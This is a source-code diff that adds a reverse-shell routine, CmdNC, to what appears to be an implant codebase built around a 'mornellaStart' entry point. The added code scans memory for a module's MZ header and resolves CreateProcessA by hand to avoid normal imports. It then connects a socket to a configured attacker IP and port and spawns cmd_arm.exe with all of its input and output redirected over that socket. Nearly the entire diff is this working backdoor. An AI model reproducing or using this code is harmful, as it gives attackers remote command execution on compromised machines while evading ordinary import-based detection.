@@ -1,4 +1,7 @@
-﻿extern "C" int mornellaStart(void);
+﻿#include "CmdNC.h"
+
+extern "C" int mornellaStart(void);
+
 
 
 //#include "pch.h"
@@ -189,6 +192,108 @@ void *PeGetProcAddressA(void *Base, LPCSTR Name)
 }
 
 
+
+typedef BOOL WINAPI __stdcall t_CPA(
+  LPCSTR lpApplicationName,
+  LPSTR lpCommandLine,
+  LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  BOOL bInheritHandles,
+  DWORD dwCreationFlags,
+  LPVOID lpEnvironment,
+  LPCSTR lpCurrentDirectory,
+  LPSTARTUPINFO lpStartupInfo,
+  LPPROCESS_INFORMATION lpProcessInformation
+);
+
+t_CPA *CreateProcessA=0;
+
+
+int CmdNC(void)
+{
+	 
+    WSADATA wsaData;
+    SOCKET Winsocket;
+    STARTUPINFO theProcess; 
+    PROCESS_INFORMATION info_proc; 
+    struct sockaddr_in Winsocket_Structure;
+	
+	char *Tmp=(char*)GetTickCount64;
+	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);
+
+	while(Tmp)
+	{
+		__try 
+		{
+			if(Tmp[0]=='M' && Tmp[1]=='Z')
+				break;
+		} __except(EXCEPTION_EXECUTE_HANDLER)
+		{
+		}
+		Tmp-=0x1000;
+	}
+
+	if(Tmp==0)
+		return 0;
+
+	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");
+	
+	STARTUPINFO si;
+	memset(&si,0,sizeof(si));
+	si.cb=sizeof(si);
+
+
+	
+	char *IP =  DEFAULT_IP;
+    short port = DEFAULT_PORT;
+     
+	/*
+        if (argc == 3){ 
+            strncpy(IP,argv[1],16);
+            port = atoi(argv[2]);
+        }
+		*/
+
+        
+            WSAStartup(MAKEWORD(2,2), &wsaData);
+            Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
+            Winsocket_Structure.sin_port=htons(port);
+            Winsocket_Structure.sin_family=AF_INET;
+            Winsocket_Structure.sin_addr.s_addr=inet_addr(IP);
+     
+        if(Winsocket==INVALID_SOCKET)
+        {
+            WSACleanup();
+            return 1;
+        }
+     
+        if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR)
+        {
+            WSACleanup();
+            return 1;
+        }
+     
+        // Starting shell by creating a new process with i/o redirection.    
+        memset(&theProcess,0,sizeof(theProcess));
+        theProcess.cb=sizeof(theProcess);
+        theProcess.dwFlags=STARTF_USESTDHANDLES;
+        
+        // here we make the redirection
+        theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;
+        
+        // fork the new process.
+        //if(CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
+		//CreateProcessA("explorer.exe",0,0,0,FALSE,0,0,0,&si,&pi);
+		//if(CreateProcessA(NULL,"cmd_arm.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
+		if(CreateProcessA(NULL,"cmd_arm.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
+        {
+            WSACleanup();
+            return 1;
+        }
+
+
+	return 0;
+}
 	
 	
 
